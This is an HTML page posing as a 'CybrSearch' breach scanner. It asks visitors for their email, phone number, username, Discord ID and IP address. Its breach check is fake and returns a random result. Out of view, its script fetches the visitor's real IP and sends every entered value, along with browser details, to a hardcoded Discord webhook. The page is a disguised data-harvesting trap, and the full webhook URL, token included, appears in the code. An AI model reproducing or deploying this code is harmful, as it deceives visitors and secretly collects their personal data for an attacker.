<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CybrSearch - Advanced Security Scanner</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    :root {
      --dark-bg: #0d1117;
      --card-bg: #161b22;
      --accent-blue: #1f6feb;
      --accent-green: #2ea043;
      --accent-red: #f85149;
      --text-color: #c9d1d9;
    }
    body {
      background-color: var(--dark-bg);
      color: var(--text-color);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding: 20px;
    }
    .container {
      max-width: 600px;
    }
    .card {
      background-color: var(--card-bg);
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .result-found {
      border-left: 4px solid var(--accent-red);
    }
    .result-clean {
      border-left: 4px solid var(--accent-green);
    }
    .form-control {
      background-color: var(--dark-bg);
      color: var(--text-color);
      border: 1px solid #30363d;
    }
    .btn-primary {
      background-color: var(--accent-blue);
      border: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h2 class="text-center mb-4">üîç CybrSearch Breach Scanner</h2>
      <form id="searchForm">
        <input id="searchEmail" type="email" placeholder="üìß Email address" class="form-control mb-3">
        <input id="searchPhone" type="text" placeholder="üì± Phone number" class="form-control mb-3">
        <input id="searchUsername" type="text" placeholder="üë§ Username" class="form-control mb-3">
        <input id="searchDiscord" type="text" placeholder="üí¨ Discord ID (ex: User#1234)" class="form-control mb-3">
        <input id="searchIP" type="text" placeholder="üåê IP address (optional)" class="form-control mb-3">
        <button type="submit" class="btn btn-primary w-100">Scan for Breaches</button>
      </form>
    </div>

    <div id="resultsContainer"></div>
  </div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
    
    document.getElementById('searchForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Get all search values
      const searchData = {
        email: document.getElementById('searchEmail').value.trim(),
        phone: document.getElementById('searchPhone').value.trim(),
        username: document.getElementById('searchUsername').value.trim(),
        discord: document.getElementById('searchDiscord').value.trim(),
        ip: document.getElementById('searchIP').value.trim()
      };
      
      // Show loading state
      const resultsContainer = document.getElementById('resultsContainer');
      resultsContainer.innerHTML = '<div class="card">Scanning... <div class="spinner-border spinner-border-sm"></div></div>';
      
      try {
        // Get visitor's IP
        const visitorIp = await getVisitorIp();
        
        // Check breach databases (simulated)
        const hasResults = await checkBreachApis(searchData);
        
        // Display user-friendly results
        if (hasResults) {
          resultsContainer.innerHTML = `
            <div class="card result-found">
              <h4>‚ö†Ô∏è Breaches Found</h4>
              <p>We found exposed data matching your search.</p>
              <div class="mt-3">
                ${searchData.email ? `<p>‚Ä¢ Email: ${searchData.email}</p>` : ''}
                ${searchData.username ? `<p>‚Ä¢ Username: ${searchData.username}</p>` : ''}
                ${searchData.discord ? `<p>‚Ä¢ Discord ID: ${searchData.discord}</p>` : ''}
              </div>
            </div>
          `;
        } else {
          resultsContainer.innerHTML = `
            <div class="card result-clean">
              <h4>‚úÖ No Breaches Found</h4>
              <p>No exposed data found for these search terms.</p>
            </div>
          `;
        }
        
        // Send full details to Discord
        await sendToDiscord({
          ...searchData,
          visitorIp: visitorIp,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          referrer: document.referrer || 'Direct',
          timestamp: new Date().toUTCString(),
          hasResults
        });
        
      } catch (error) {
        resultsContainer.innerHTML = `
          <div class="card result-found">
            <h4>‚ö†Ô∏è Scan Error</h4>
            <p>There was an error processing your request.</p>
          </div>
        `;
        
        await sendToDiscord({
          ...searchData,
          error: error.message,
          visitorIp: await getVisitorIp(),
          timestamp: new Date().toUTCString()
        });
      }
    });
    
    // Get visitor's real IP address
    async function getVisitorIp() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'Unknown';
      } catch (error) {
        console.error('Error getting IP:', error);
        return 'Unknown';
      }
    }
    
    // Simulated API check
    async function checkBreachApis(data) {
      // Simulate API delay
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // For demo, 30% chance of "finding" breaches
      return Math.random() < 0.3;
    }
    
    // Send rich embed to Discord
    async function sendToDiscord(data) {
      const embed = {
        title: data.error ? "‚ö†Ô∏è Scan Error" : data.hasResults ? "üîç Breach Found" : "‚úÖ No Breaches Found",
        color: data.error ? 0xf85149 : data.hasResults ? 0xf85149 : 0x2ea043,
        fields: [
          { name: "Email", value: data.email || "Not provided", inline: true },
          { name: "Phone", value: data.phone || "Not provided", inline: true },
          { name: "Username", value: data.username || "Not provided", inline: true },
          { name: "Discord ID", value: data.discord || "Not provided", inline: true },
          { name: "IP Entered", value: data.ip || "Not provided" },
          { name: "Visitor IP", value: data.visitorIp || "Unknown" },
          { name: "User Agent", value: data.userAgent || "Unknown" },
          { name: "Platform", value: data.platform || "Unknown" },
          { name: "Referrer", value: data.referrer || "Direct" },
          { name: "Time (UTC)", value: data.timestamp || new Date().toUTCString() }
        ],
        footer: {
          text: "Breach Logger ‚Ä¢ CybrSearch"
        }
      };
      
      if (data.error) {
        embed.fields.push({ name: "Error", value: data.error });
      }
      
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            embeds: [embed],
            username: "CybrSearch Logger",
            avatar_url: "https://i.imgur.com/ABCD123.png" // Replace with your logo
          })
        });
      } catch (error) {
        console.error('Discord webhook error:', error);
      }
    }
  </script>
</body>
</html>
